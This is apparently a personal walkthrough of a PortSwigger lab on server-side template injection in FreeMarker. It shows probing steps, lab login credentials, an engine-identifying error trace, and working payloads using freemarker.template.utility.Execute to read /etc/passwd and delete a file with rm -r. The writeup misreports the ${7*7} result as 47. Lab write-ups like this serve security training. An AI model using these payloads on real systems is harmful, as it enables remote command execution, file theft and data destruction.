## PortSwigger
--Server-side template injection using documentation

Steps:
1-detect which paramater is vulnerable
  .check /product?productId ${7*7}  ==> bad reqesut
  .After Enter into Account {content-manager:C0nt3ntM4n4g3r}
   found that cna modify of template 
    /product/template?productId=1

    csrf=UdDhtQSDLKcZisR4gKjR17LPhcCJh4Mh&template=${7*7}&template-action=preview 
==> yes it is success ==> result 47 

2- use ${_self} to detect which template is used 
result
#######################################################
FreeMarker template error (DEBUG mode; use RETHROW in production!): The following has evaluated to null or missing: ==> _self [in template "freemarker" at line 1, column 3] ---- Tip: If the failing expression is known to legally refer to something that's sometimes null or missing, either specify a default value like myOptionalVar!myDefault, or use <#if myOptionalVar??>when-present<#else>when-missing</#if>. (These only cover the last step of the expression; to cover the whole expression, use parenthesis: (myOptionalVar.foo)!myDefault, (myOptionalVar.foo)?? ---- ---- FTL stack trace ("~" means nesting-related): - Failed at: ${_self} [in template "freemarker" at line 1, column 1] ---- Java stack trace (for programmers): ---- freemarker.core.InvalidReferenceException: [... Exception message was already printed; see it above ...] at freemarker.core.InvalidReferenceException.getInstance(InvalidReferenceException.java:134) at freemarker.core.EvalUtil.coerceModelToTextualCommon(EvalUtil.java:479) at freemarker.core.EvalUtil.coerceModelToStringOrMarkup(EvalUtil.java:401) at freemarker.core.EvalUtil.coerceModelToStringOrMarkup(EvalUtil.java:370) at freemarker.core.DollarVariable.calculateInterpolatedStringOrMarkup(DollarVariable.java:100) at freemarker.core.DollarVariable.accept(DollarVariable.java:63) at freemarker.core.Environment.visit(Environment.java:331) at freemarker.core.Environment.process(Environment.java:310) at freemarker.template.Template.process(Template.java:383) at lab.actions.templateengines.FreeMarker.processInput(FreeMarker.java:58) at lab.actions.templateengines.FreeMarker.act(FreeMarker.java:42) at lab.actions.common.Action.act(Action.java:57) at lab.actions.common.Action.run(Action.java:39) at lab.actions.templateengines.FreeMarker.main(FreeMarker.java:23) 

template is => FreeMaker
###################################



3-inject malicious tamplate
${"freemarker.template.utility.Execute"?new()("cat /etc/passwd")} 
ok it can show content of  /etc/passwd

4-delete carlos file 
${"freemarker.template.utility.Execute"?new()("rm -r /home/carlos/morale.txt")}

Yes the lab solved 
